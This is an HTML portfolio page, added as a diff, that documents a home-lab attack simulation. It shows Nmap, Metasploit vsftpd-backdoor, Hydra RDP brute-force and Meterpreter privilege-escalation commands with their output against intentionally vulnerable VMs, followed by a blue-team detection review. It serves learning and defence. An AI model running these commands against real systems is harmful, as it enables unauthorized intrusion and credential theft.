@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ethical Hacking Attack Simulation Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --paper: #F7F5F3; --paper-dim: #EFEBE7; --grid: #E2DAD3; --ink: #241A15; --ink-soft: #5C4B41;
+    --line: #D4C7BC; --crit: #B4392E; --crit-bg: #F7DEDA; --high: #C8722C; --high-bg: #F8E4CE;
+    --med: #C6A324; --med-bg: #F6EDC6; --low: #3E8F5C; --low-bg: #DBEFE1;
+    --wire: #9A4B2F; --wire-soft: #F1DED2; --card: #FFFFFF; --radius: 3px;
+    --mono: 'JetBrains Mono', ui-monospace, monospace; --sans: 'Inter', system-ui, sans-serif; --display: 'Space Grotesk', system-ui, sans-serif;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --paper:#181310; --paper-dim:#1F1815; --grid:#2C231D; --ink:#F1E9E3; --ink-soft:#C2B0A4;
+      --line:#382C24; --crit:#E27466; --crit-bg:#3A211D; --high:#E7A868; --high-bg:#3A2C18;
+      --med:#E0C765; --med-bg:#37311A; --low:#6FC98E; --low-bg:#173A26; --wire:#D98956; --wire-soft:#2E2119; --card:#1F1815;
+    }
+  }
+  :root[data-theme="dark"] {
+    --paper:#181310; --paper-dim:#1F1815; --grid:#2C231D; --ink:#F1E9E3; --ink-soft:#C2B0A4;
+    --line:#382C24; --crit:#E27466; --crit-bg:#3A211D; --high:#E7A868; --high-bg:#3A2C18;
+    --med:#E0C765; --med-bg:#37311A; --low:#6FC98E; --low-bg:#173A26; --wire:#D98956; --wire-soft:#2E2119; --card:#1F1815;
+  }
+  * { box-sizing: border-box; }
+  body { margin:0; background: linear-gradient(var(--grid) 1px, transparent 1px) 0 0/100% 42px, linear-gradient(90deg, var(--grid) 1px, transparent 1px) 0 0/42px 100%, var(--paper); color: var(--ink); font-family: var(--sans); line-height:1.6; }
+  a { color: var(--wire); } code, .mono { font-family: var(--mono); }
+  .shell { display:grid; grid-template-columns:260px minmax(0,1fr); max-width:1280px; margin:0 auto; }
+  @media (max-width:900px){ .shell{grid-template-columns:1fr;} nav.toc{display:none;} }
+  nav.toc { position:sticky; top:0; align-self:start; height:100vh; overflow-y:auto; padding:28px 18px 40px 24px; border-right:1px solid var(--line); }
+  nav.toc .brand { font-family:var(--display); font-weight:700; font-size:1.05rem; margin-bottom:4px; }
+  nav.toc .brand-sub { font-size:0.72rem; color:var(--ink-soft); margin-bottom:22px; font-family:var(--mono); }
+  nav.toc ol { list-style:none; margin:0; padding:0; counter-reset:sec; }
+  nav.toc li { counter-increment:sec; margin-bottom:1px; }
+  nav.toc a { display:block; text-decoration:none; color:var(--ink-soft); font-size:0.82rem; padding:4px 8px; border-left:2px solid transparent; }
+  nav.toc a::before { content: counter(sec, decimal-leading-zero) " · "; font-family:var(--mono); color:var(--line); font-size:0.74rem; }
+  nav.toc a:hover { color:var(--ink); border-left-color:var(--wire); background:var(--paper-dim); }
+  main { padding:0 0 80px; min-width:0; }
+  header.hero { padding:64px 48px 40px; border-bottom:1px solid var(--line); }
+  @media (max-width:640px){ header.hero, section{ padding-left:22px !important; padding-right:22px !important; } }
+  header.hero .kicker { font-family:var(--mono); font-size:0.78rem; color:var(--wire); margin-bottom:14px; }
+  header.hero h1 { font-family:var(--display); font-size:clamp(2.0rem,5vw,3.2rem); line-height:1.06; margin:0 0 20px; max-width:20ch; }
+  header.hero p.lede { max-width:64ch; color:var(--ink-soft); font-size:1.06rem; }
+  .hero-strip { display:flex; gap:22px; margin-top:32px; flex-wrap:wrap; }
+  .hero-strip div { border-left:2px solid var(--wire); padding-left:10px; font-size:0.82rem; color:var(--ink-soft); max-width:24ch; }
+  .hero-strip strong { display:block; color:var(--ink); font-family:var(--display); font-size:1.35rem; }
+  .skills-row { margin-top:26px; display:flex; flex-wrap:wrap; gap:8px; }
+  .skill-chip { font-family:var(--mono); font-size:0.72rem; border:1px solid var(--line); border-radius:999px; padding:4px 12px; color:var(--ink-soft); }
+  .warn-banner { margin-top:28px; background:var(--wire-soft); border:1px solid var(--wire); border-radius:var(--radius); padding:14px 18px; font-size:0.86rem; color:var(--ink); max-width:64ch; }
+  .warn-banner strong { color:var(--wire); }
+  section { padding:56px 48px; border-bottom:1px solid var(--line); }
+  section:last-of-type { border-bottom:none; }
+  section h2 { font-family:var(--display); font-size:1.6rem; margin:0 0 8px; }
+  section .h2-note { color:var(--ink-soft); font-size:0.94rem; margin:0 0 26px; max-width:68ch; }
+  h3 { font-family:var(--display); font-size:1.08rem; margin:30px 0 10px; }
+  p { max-width:72ch; } ul, ol.plain { max-width:72ch; padding-left:22px; } li { margin-bottom:6px; }
+  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:24px; }
+  .grid-3 { display:grid; grid-template-columns:repeat(3,1fr); gap:16px; }
+  @media (max-width:800px){ .grid-2, .grid-3{ grid-template-columns:1fr; } }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:18px 20px; }
+  .card h4 { margin:0 0 6px; font-family:var(--display); font-size:1rem; }
+  .card .tag { font-family:var(--mono); font-size:0.72rem; color:var(--wire); }
+  table { border-collapse:collapse; width:100%; margin:18px 0 8px; font-size:0.88rem; }
+  caption { text-align:left; font-size:0.8rem; color:var(--ink-soft); margin-bottom:6px; font-family:var(--mono); }
+  th, td { border-bottom:1px solid var(--line); text-align:left; padding:9px 12px; vertical-align:top; }
+  th { font-family:var(--mono); font-size:0.7rem; text-transform:uppercase; letter-spacing:0.03em; color:var(--ink-soft); font-weight:500; }
+  tr:hover td { background:var(--paper-dim); }
+  pre.term { background:var(--ink); color:var(--paper); padding:16px 18px; border-radius:var(--radius); overflow-x:auto; font-family:var(--mono); font-size:0.82rem; line-height:1.55; }
+  pre.term .c { color:#D9A97E; } pre.term .g { color:#9FD98A; } pre.term .m { color:var(--high); } pre.term .r { color:var(--crit); } pre.term .y { color:#E0C765; }
+  .diagram-wrap { background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:22px; overflow-x:auto; margin:18px 0; }
+  .diagram-wrap svg { display:block; margin:0 auto; max-width:100%; height:auto; }
+  .diagram-cap { font-size:0.8rem; color:var(--ink-soft); margin-top:10px; font-family:var(--mono); }
+  .sev-badge { font-family:var(--mono); font-size:0.66rem; font-weight:600; border-radius:999px; padding:2px 10px; text-transform:uppercase; letter-spacing:0.02em; }
+  .sev-critical { background:var(--crit-bg); color:var(--crit); } .sev-high { background:var(--high-bg); color:var(--high); }
+  .sev-medium { background:var(--med-bg); color:var(--med); } .sev-low { background:var(--low-bg); color:var(--low); }
+  .case-box { background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:22px; margin:18px 0; }
+  .case-box h4 { font-family:var(--display); margin:0 0 4px; }
+  .case-step { border-left:2px solid var(--wire); padding-left:14px; margin:16px 0; }
+  .case-step .step-tag { font-family:var(--mono); font-size:0.7rem; color:var(--wire); display:block; margin-bottom:2px; }
+  .path-demo { background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:20px; margin:18px 0; }
+  .path-toolbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; flex-wrap:wrap; gap:10px; }
+  .path-toolbar .counts { font-family:var(--mono); font-size:0.78rem; color:var(--ink-soft); }
+  .stage-row { display:grid; grid-template-columns:34px 1fr 130px; gap:12px; align-items:center; padding:12px 10px; border-bottom:1px solid var(--line); font-size:0.87rem; }
+  .stage-row:last-child { border-bottom:none; }
+  .stage-row .stage-num { font-family:var(--mono); color:var(--wire); font-weight:700; }
+  .stage-row .stage-title { font-weight:600; }
+  .stage-row .stage-meta { font-family:var(--mono); font-size:0.72rem; color:var(--ink-soft); }
+  .stage-row.done { opacity:0.55; }
+  .mini-btn { font-family:var(--mono); font-size:0.72rem; border:1px solid var(--line); background:var(--paper-dim); color:var(--ink); border-radius:var(--radius); padding:5px 9px; cursor:pointer; margin-right:4px; }
+  .mini-btn:hover { border-color:var(--wire); color:var(--wire); }
+  .mini-btn:disabled { opacity:0.35; cursor:default; }
+  .evidence-panel { background:var(--paper-dim); border-radius:var(--radius); padding:14px 16px; margin:-4px 0 10px; font-family:var(--mono); font-size:0.78rem; color:var(--ink-soft); display:none; white-space:pre-wrap; }
+  .evidence-panel.open { display:block; }
+  .path-log { font-family:var(--mono); font-size:0.78rem; color:var(--ink-soft); background:var(--paper-dim); border-radius:var(--radius); padding:12px 14px; margin-top:14px; max-height:170px; overflow-y:auto; }
+  .path-log div { padding:2px 0; border-bottom:1px dashed var(--line); } .path-log div:last-child { border-bottom:none; }
+  .path-log .lt { color:var(--wire); margin-right:8px; }
+  .kpi-card { background:var(--card); border:1px solid var(--line); border-radius:var(--radius); padding:18px 20px; }
+  .kpi-card .kpi-num { font-family:var(--display); font-size:1.8rem; }
+  .kpi-card .kpi-label { font-family:var(--mono); font-size:0.7rem; color:var(--ink-soft); }
+  .future-item { border-left:2px solid var(--wire); padding-left:16px; margin-bottom:24px; }
+  .future-item h4 { font-family:var(--display); margin:0 0 4px; font-size:1.02rem; }
+  .future-item .when { font-family:var(--mono); font-size:0.7rem; color:var(--wire); }
+  .glossary dt { font-family:var(--mono); font-weight:600; margin-top:12px; color:var(--wire); }
+  .glossary dd { margin:2px 0 0; color:var(--ink-soft); max-width:68ch; }
+  footer { padding:40px 48px 60px; font-size:0.8rem; color:var(--ink-soft); font-family:var(--mono); }
+</style>
+</head>
+<body>
+<div class="shell">
+
+<nav class="toc">
+  <div class="brand">Red Team Lab</div>
+  <div class="brand-sub">recon → exploit → defend</div>
+  <ol>
+    <li><a href="#start">Overview</a></li>
+    <li><a href="#labenv">Lab environment</a></li>
+    <li><a href="#methodology">Attack methodology</a></li>
+    <li><a href="#tools">Tools &amp; Metasploit workflow</a></li>
+    <li><a href="#case-exploit">Case study 1: exploitation</a></li>
+    <li><a href="#case-postex">Case study 2: post-exploitation</a></li>
+    <li><a href="#blueteam">Turning around: the blue team view</a></li>
+    <li><a href="#demo">Live demo — walk the attack path</a></li>
+    <li><a href="#kpis">What I measured</a></li>
+    <li><a href="#future">Where red teaming is heading</a></li>
+    <li><a href="#glossary">Glossary</a></li>
+  </ol>
+</nav>
+
+<main>
+
+  <header class="hero" id="start">
+    <div class="kicker">// ethical hacking attack simulation — portfolio project</div>
+    <h1>Building and breaking my own network, on purpose</h1>
+    <p class="lede">A controlled home lab I built to practice the full attack chain — reconnaissance, enumeration, exploitation, and post-exploitation — against intentionally vulnerable machines, then reviewed from the defender's side to see what my own attack would have looked like in the logs.</p>
+    <div class="hero-strip">
+      <div><strong>4</strong>stage attack chain, executed hands-on</div>
+      <div><strong>2</strong>full case studies with real Metasploit output</div>
+      <div><strong>1</strong>interactive attack path you can walk through</div>
+    </div>
+    <div class="skills-row">
+      <span class="skill-chip">Kali Linux</span>
+      <span class="skill-chip">Metasploit</span>
+      <span class="skill-chip">Nmap</span>
+      <span class="skill-chip">Privilege Escalation</span>
+      <span class="skill-chip">Networking</span>
+      <span class="skill-chip">Log Analysis</span>
+    </div>
+    <div class="warn-banner">
+      <strong>Scope note:</strong> everything documented here was run entirely inside an isolated, host-only virtual network I control — attacker and target machines both mine, with no connection to the internet or any third-party system. None of this was performed against a system I don't own or don't have explicit written authorization to test.
+    </div>
+  </header>
+
+  <!-- ============ LAB ENV ============ -->
+  <section id="labenv">
+    <h2>1 · Lab environment</h2>
+    <p class="h2-note">Before any attack, the lab itself — an isolated network where nothing can leak out and nothing real can get hurt.</p>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 900 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Isolated lab network diagram: attacker Kali VM and target VMs on a host-only virtual switch, with no route to the internet">
+        <defs>
+          <marker id="ea1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="var(--wire)"/></marker>
+          <style>.ebx{fill:var(--card);stroke:var(--wire);stroke-width:1.5;} .elb{font-family:'Space Grotesk',sans-serif;font-size:12px;fill:var(--ink);font-weight:600;text-anchor:middle;} .esb{font-family:'JetBrains Mono',monospace;font-size:9px;fill:var(--ink-soft);text-anchor:middle;}</style>
+        </defs>
+        <rect x="30" y="30" width="180" height="70" rx="4" class="ebx"/><text x="120" y="58" class="elb">Kali Linux</text><text x="120" y="74" class="elb">(attacker)</text><text x="120" y="90" class="esb">192.168.56.10</text>
+        <rect x="30" y="160" width="180" height="70" rx="4" class="ebx"/><text x="120" y="188" class="elb">Metasploitable2</text><text x="120" y="204" class="elb">(target)</text><text x="120" y="220" class="esb">192.168.56.20</text>
+        <rect x="690" y="95" width="180" height="70" rx="4" class="ebx"/><text x="780" y="123" class="elb">Windows target</text><text x="780" y="139" class="elb">(target)</text><text x="780" y="155" class="esb">192.168.56.30</text>
+        <rect x="330" y="95" width="240" height="70" rx="4" class="ebx"/><text x="450" y="123" class="elb">Host-only virtual switch</text><text x="450" y="139" class="esb">VirtualBox/VMware internal network</text><text x="450" y="155" class="esb" fill="var(--crit)">no route to the internet</text>
+        <line x1="210" y1="65" x2="330" y2="120" stroke="var(--wire)" marker-end="url(#ea1)"/>
+        <line x1="210" y1="195" x2="330" y2="140" stroke="var(--wire)" marker-end="url(#ea1)"/>
+        <line x1="570" y1="130" x2="690" y2="130" stroke="var(--wire)" marker-end="url(#ea1)"/>
+      </svg>
+      <div class="diagram-cap">Fig. 1 — Every machine lives on a host-only virtual network with no bridge to my real network or the internet. This is what makes the whole lab authorized and safe: I own every IP address in it.</div>
+    </div>
+    <div class="grid-2">
+      <div class="card"><h4>Attacker machine</h4><p>Kali Linux — a Debian-based distro that ships with the recon, exploitation, and post-exploitation tooling pre-installed: Nmap, Metasploit, Hydra, John the Ripper, Wireshark.</p></div>
+      <div class="card"><h4>Target machines</h4><p>Metasploitable2, an intentionally vulnerable Linux VM built specifically for training, plus a Windows VM I hardened progressively less to practice different exploitation paths.</p></div>
+    </div>
+  </section>
+
+  <!-- ============ METHODOLOGY ============ -->
+  <section id="methodology">
+    <h2>2 · Attack methodology</h2>
+    <p class="h2-note">The same four-stage chain every real engagement follows, just run against machines I own.</p>
+    <div class="diagram-wrap">
+      <svg viewBox="0 0 950 160" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Attack chain: reconnaissance, enumeration, exploitation, post-exploitation">
+        <defs>
+          <marker id="ma1" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="var(--wire)"/></marker>
+          <style>.mbx{fill:var(--card);stroke:var(--wire);stroke-width:1.5;} .mlb{font-family:'Space Grotesk',sans-serif;font-size:12px;fill:var(--ink);font-weight:600;text-anchor:middle;} .msb{font-family:'JetBrains Mono',monospace;font-size:8.5px;fill:var(--ink-soft);text-anchor:middle;}</style>
+        </defs>
+        <rect x="10" y="50" width="210" height="60" rx="4" class="mbx"/><text x="115" y="75" class="mlb">Reconnaissance</text><text x="115" y="92" class="msb">what's alive, what's exposed</text>
+        <rect x="250" y="50" width="210" height="60" rx="4" class="mbx"/><text x="355" y="75" class="mlb">Enumeration</text><text x="355" y="92" class="msb">service versions, known weaknesses</text>
+        <rect x="490" y="50" width="210" height="60" rx="4" class="mbx"/><text x="595" y="75" class="mlb">Exploitation</text><text x="595" y="92" class="msb">gain initial access</text>
+        <rect x="730" y="50" width="210" height="60" rx="4" class="mbx"/><text x="835" y="75" class="mlb">Post-exploitation</text><text x="835" y="92" class="msb">privilege escalation, evidence of impact</text>
+        <line x1="220" y1="80" x2="250" y2="80" stroke="var(--wire)" marker-end="url(#ma1)"/>
+        <line x1="460" y1="80" x2="490" y2="80" stroke="var(--wire)" marker-end="url(#ma1)"/>
+        <line x1="700" y1="80" x2="730" y2="80" stroke="var(--wire)" marker-end="url(#ma1)"/>
+      </svg>
+      <div class="diagram-cap">Fig. 2 — This maps onto the same Lockheed Martin kill chain and MITRE ATT&CK tactics from my SOC project — the difference here is I'm generating the attacker-side data myself, not analyzing someone else's.</div>
+    </div>
+  </section>
+
+  <!-- ============ TOOLS ============ -->
+  <section id="tools">
+    <h2>3 · Tools &amp; Metasploit workflow</h2>
+    <p class="h2-note">What I actually ran, in the order I ran it.</p>
+    <table>
+      <caption>tools used in this lab</caption>
+      <thead><tr><th>Tool</th><th>Stage</th><th>What I used it for</th></tr></thead>
+      <tbody>
+        <tr><td>Nmap</td><td>Recon / enumeration</td><td>Discover live hosts, open ports, service versions</td></tr>
+        <tr><td>Metasploit</td><td>Exploitation</td><td>Select, configure, and run exploit modules against confirmed vulnerabilities</td></tr>
+        <tr><td>Hydra</td><td>Exploitation</td><td>Credential brute-forcing against exposed services</td></tr>
+        <tr><td>John the Ripper</td><td>Post-exploitation</td><td>Cracking password hashes recovered after access</td></tr>
+        <tr><td>Wireshark</td><td>Verification</td><td>Confirming exactly what traffic my own tools generated, from the wire up</td></tr>
+      </tbody>
+    </table>
+    <h3>The Metasploit workflow I use every time</h3>
+    <pre class="term">msfconsole
+
+<span class="c"># search for a module matching a known service/version</span>
+msf6 &gt; search vsftpd
+
+<span class="c"># select it</span>
+msf6 &gt; use exploit/unix/ftp/vsftpd_234_backdoor
+
+<span class="c"># see what it needs from me</span>
+msf6 exploit(vsftpd_234_backdoor) &gt; show options
+
+<span class="c"># point it at my target</span>
+msf6 exploit(vsftpd_234_backdoor) &gt; set RHOSTS 192.168.56.20
+
+<span class="c"># run it</span>
+msf6 exploit(vsftpd_234_backdoor) &gt; run</pre>
+  </section>
+
+  <!-- ============ CASE STUDY 1 ============ -->
+  <section id="case-exploit">
+    <h2>4 · Case study 1 — exploiting a known backdoor</h2>
+    <p class="h2-note">My first full run through the chain, against Metasploitable2's deliberately backdoored FTP service.</p>
+    <div class="case-box">
+      <h4>Target: <span class="mono">vsftpd 2.3.4 — 192.168.56.20:21</span> <span class="sev-badge sev-critical" style="margin-left:8px;">critical</span></h4>
+      <div class="case-step">
+        <span class="step-tag">STEP 1 — RECONNAISSANCE &amp; ENUMERATION</span>
+        <p>I started with a version scan across the target to see what was actually running before picking any tool.</p>
+        <pre class="term">nmap -sV -p- 192.168.56.20
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     <span class="r">vsftpd 2.3.4</span>
+22/tcp open  ssh     OpenSSH 4.7p1
+80/tcp open  http    Apache 2.2.8</pre>
+        <p>vsftpd 2.3.4 is a well-documented, intentionally backdoored version bundled specifically into training VMs like this one — I recognized it immediately from the version banner alone.</p>
+      </div>
+      <div class="case-step">
+        <span class="step-tag">STEP 2 — EXPLOITATION</span>
+        <p>I searched Metasploit for a matching module and ran it against the target as shown in §3.</p>
+        <pre class="term">msf6 exploit(vsftpd_234_backdoor) &gt; run
+
+[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 192.168.56.20:21 - USER: 331 Please specify the password.
+[+] 192.168.56.20:21 - Backdoor service has been spawned, handling...
+[+] 192.168.56.20:21 - UID: uid=0(root) gid=0(root)
+<span class="g">[*] Command shell session 1 opened (192.168.56.10:4444 -> 192.168.56.20:6200)</span></pre>
+        <p>Root shell, no credentials needed — the exploit works because a malicious backdoor was intentionally planted in that exact version of vsftpd's source before it was compiled into this training image.</p>
+      </div>
+      <div class="case-step">
+        <span class="step-tag">STEP 3 — CONFIRMATION</span>
+        <p>I confirmed the access level directly from the shell I'd just landed in.</p>
+        <pre class="term">id
+uid=0(root) gid=0(root)
+hostname
+metasploitable</pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ CASE STUDY 2 ============ -->
+  <section id="case-postex">
+    <h2>5 · Case study 2 — post-exploitation on the Windows target</h2>
+    <p class="h2-note">A slower path: initial access with a low-privilege foothold, then escalation.</p>
+    <div class="case-box">
+      <h4>Target: <span class="mono">Windows VM — 192.168.56.30</span> <span class="sev-badge sev-high" style="margin-left:8px;">high</span></h4>
+      <div class="case-step">
+        <span class="step-tag">STEP 1 — INITIAL ACCESS</span>
+        <p>Unlike case study 1, this target didn't have a pre-planted backdoor — I got in through a weak local account I'd deliberately configured, using Hydra to demonstrate the brute-force path.</p>
+        <pre class="term">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.30 rdp
+
+[22][rdp] host: 192.168.56.30   login: admin   password: <span class="r">password123</span></pre>
+      </div>
+      <div class="case-step">
+        <span class="step-tag">STEP 2 — POST-EXPLOITATION: PRIVILEGE ESCALATION</span>
+        <p>Landing as a standard user, I used a Meterpreter session to check for common Windows privilege escalation paths — misconfigured services, unquoted paths, stored credentials.</p>
+        <pre class="term">meterpreter &gt; getuid
+Server username: WIN-TARGET\lowpriv
+
+meterpreter &gt; run post/multi/recon/local_exploit_suggester
+
+[+] 192.168.56.30 - exploit/windows/local/ms16_075_reflection_juicy: The target appears vulnerable
+
+meterpreter &gt; getsystem
+<span class="g">...got system via technique 1</span>
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM</pre>
+      </div>
+      <div class="case-step">
+        <span class="step-tag">STEP 3 — EVIDENCE OF IMPACT, THEN STOP</span>
+        <p>At SYSTEM level I confirmed impact by listing sensitive local files and dumping local password hashes — then stopped there. In a real engagement, this is exactly the line: prove the access is real, don't go further than needed to make the point.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ BLUE TEAM VIEW ============ -->
+  <section id="blueteam">
+    <h2>6 · Turning around: the blue team view</h2>
+    <p class="h2-note">The most useful part of running my own attacks — going back afterward and asking what a defender would have actually seen.</p>
+    <div class="grid-2">
+      <div class="card">
+        <h4>What case study 1 would trigger</h4>
+        <p>A sudden root shell spawned from the FTP service's process tree is exactly the kind of anomalous parent/child process relationship an EDR tool flags immediately — the same detection logic I documented in my SOC project's process-creation alerts.</p>
+      </div>
+      <div class="card">
+        <h4>What case study 2 would trigger</h4>
+        <p>Hydra's brute-force attempt would show up as a burst of failed RDP logins from one source in a short window — the exact same pattern as the brute-force IOC I investigated in my threat-intel project, just generated by my own tooling instead of a real attacker's.</p>
+      </div>
+    </div>
+    <p>This is the loop I try to close every time: attack it, then defend it. Running both sides of the same incident makes the detection logic in my other two projects concrete instead of theoretical — I'm not guessing what a brute-force login burst looks like in a SIEM, I generated one myself and went and checked.</p>
+  </section>
+
+  <!-- ============ LIVE DEMO ============ -->
+  <section id="demo">
+    <h2>7 · Live demo — walk the attack path</h2>
+    <p class="h2-note">The four-stage chain from §2, laid out as steps you can walk through — click "View details" on each stage to see what happened at that point.</p>
+    <div class="path-demo">
+      <div class="path-toolbar">
+        <span class="counts" id="pathCounts">0 of 4 stages viewed</span>
+        <button class="mini-btn" onclick="window.__resetPath()">↺ Reset path</button>
+      </div>
+      <div id="pathQueue"></div>
+      <div class="path-log" id="pathLog"><div><span class="lt">--</span>waiting for you to start the walkthrough…</div></div>
+    </div>
+  </section>
+
+  <!-- ============ KPIs ============ -->
+  <section id="kpis">
+    <h2>8 · What I measured</h2>
+    <div class="grid-3">
+      <div class="kpi-card"><div class="kpi-num">Time to initial access</div><div class="kpi-label">Recon start to first shell — a proxy for how exposed a target actually is</div></div>
+      <div class="kpi-card"><div class="kpi-num">Privilege escalation path count</div><div class="kpi-label">How many distinct routes to SYSTEM/root existed on a target</div></div>
+      <div class="kpi-card"><div class="kpi-num">Detection coverage</div><div class="kpi-label">Which of my own attack steps would actually be logged, checked against §6</div></div>
+      <div class="kpi-card"><div class="kpi-num">Noise generated</div><div class="kpi-label">How obvious each technique was on the wire, via Wireshark</div></div>
+    </div>
+  </section>
+
+  <!-- ============ FUTURE ============ -->
+  <section id="future">
+    <h2>9 · Where red teaming is heading</h2>
+    <div class="future-item"><div class="when">GROWING FAST</div><h4>Breach and attack simulation (BAS) platforms</h4><p>Automated, continuous adversary simulation tools run attack techniques on a schedule instead of once a year, keeping detection coverage honest between full pentests.</p></div>
+    <div class="future-item"><div class="when">MATURING</div><h4>Purple teaming</h4><p>Red and blue teams working the same exercise together in real time, rather than a report handed over the wall afterward — closer to the attack/defend loop in §6, done live.</p></div>
+    <div class="future-item"><div class="when">GROWING</div><h4>Cloud-native attack paths</h4><p>Traditional network exploitation is being joined by identity- and misconfiguration-based attack paths in cloud environments (IAM privilege chains, exposed storage), a different skill set from classic host exploitation.</p></div>
+    <div class="future-item"><div class="when">EARLY</div><h4>AI-assisted adversary emulation</h4><p>LLM-driven agents are starting to automate parts of recon and initial exploitation-path selection, though validating real impact still needs a human at the keyboard.</p></div>
+  </section>
+
+  <!-- ============ GLOSSARY ============ -->
+  <section id="glossary">
+    <h2>10 · Quick glossary</h2>
+    <dl class="glossary">
+      <dt>Host-only network</dt><dd>A virtual network mode where VMs can only talk to each other and the host machine, never the outside internet.</dd>
+      <dt>Exploit module</dt><dd>Pre-built code in a framework like Metasploit that automates triggering a specific known vulnerability.</dd>
+      <dt>Meterpreter</dt><dd>An advanced Metasploit payload that gives an interactive, in-memory session on a compromised host.</dd>
+      <dt>Privilege escalation</dt><dd>Moving from a low-privilege foothold to administrator/root/SYSTEM level access.</dd>
+      <dt>Persistence</dt><dd>Techniques for maintaining access to a compromised system across reboots — deliberately not demonstrated here, since it's the step with the highest misuse risk.</dd>
+      <dt>Purple teaming</dt><dd>Red and blue teams collaborating in the same exercise to improve detection in real time, rather than testing in isolation.</dd>
+    </dl>
+  </section>
+
+  <footer>
+    portfolio project · performed entirely inside an isolated virtual lab I own, against intentionally vulnerable training machines · no real system, network, or organization was involved
+  </footer>
+
+</main>
+</div>
+
+<script>
+  var STAGES = [
+    { id: 1, title: 'Reconnaissance & Enumeration', meta: 'Nmap version scan', detail: 'nmap -sV -p- 192.168.56.20\n\nFound vsftpd 2.3.4 on port 21 — a version I recognized as having a known, intentionally planted backdoor used in training environments.' },
+    { id: 2, title: 'Exploitation', meta: 'Metasploit vsftpd module', detail: 'msf6 exploit(vsftpd_234_backdoor) > run\n\nBackdoor service spawned a root shell with no credentials required — session opened from 192.168.56.10 to 192.168.56.20:6200.' },
+    { id: 3, title: 'Post-Exploitation', meta: 'Privilege confirmation', detail: 'id\nuid=0(root) gid=0(root)\n\nConfirmed full root access on the target, then stopped — proof of access achieved, no further action taken.' },
+    { id: 4, title: 'Defensive Review', meta: 'Blue team pass', detail: 'Reviewed what this attack would generate in logs: an anomalous child process spawned by the FTP service — exactly the kind of parent/child process anomaly an EDR tool is built to catch.' }
+  ];
+  var pstate = {};
+  function resetPState(){ pstate = {}; STAGES.forEach(function(s){ pstate[s.id] = { open:false, viewed:false }; }); }
+  resetPState();
+
+  function renderPath(){
+    var c = document.getElementById('pathQueue'); c.innerHTML = '';
+    var viewedCount = 0;
+    STAGES.forEach(function(s){
+      var st = pstate[s.id];
+      if (st.viewed) viewedCount++;
+      var row = document.createElement('div');
+      row.className = 'stage-row' + (st.viewed ? ' done' : '');
+      row.innerHTML =
+        '<span class="stage-num">' + String(s.id).padStart(2,'0') + '</span>' +
+        '<span><span class="stage-title">' + s.title + '</span><br><span class="stage-meta">' + s.meta + '</span></span>' +
+        '<span></span>';
+      var actionCell = row.children[2];
+      var btn = document.createElement('button');
+      btn.className = 'mini-btn';
+      btn.textContent = st.open ? 'Hide details' : 'View details';
+      btn.onclick = (function(id){ return function(){ toggleStage(id); }; })(s.id);
+      actionCell.appendChild(btn);
+      c.appendChild(row);
+      if (st.open){
+        var panel = document.createElement('div');
+        panel.className = 'evidence-panel open';
+        panel.textContent = s.detail;
+        c.appendChild(panel);
+      }
+    });
+    document.getElementById('pathCounts').textContent = viewedCount + ' of ' + STAGES.length + ' stages viewed';
+  }
+  function toggleStage(id){
+    pstate[id].open = !pstate[id].open;
+    if (pstate[id].open && !pstate[id].viewed){
+      pstate[id].viewed = true;
+      logP('Stage ' + id + ' — "' + STAGES.find(function(s){return s.id===id;}).title + '" reviewed');
+    }
+    renderPath();
+  }
+  function logP(text){
+    var log = document.getElementById('pathLog');
+    var d = document.createElement('div');
+    var t = new Date().toTimeString().slice(0,8);
+    d.innerHTML = '<span class="lt">' + t + '</span>' + text;
+    log.appendChild(d); log.scrollTop = log.scrollHeight;
+  }
+  window.__resetPath = function(){
+    resetPState();
+    document.getElementById('pathLog').innerHTML = '<div><span class="lt">--</span>path reset — waiting for you to start the walkthrough…</div>';
+    renderPath();
+  };
+  renderPath();
+</script>
+</body>
+</html>
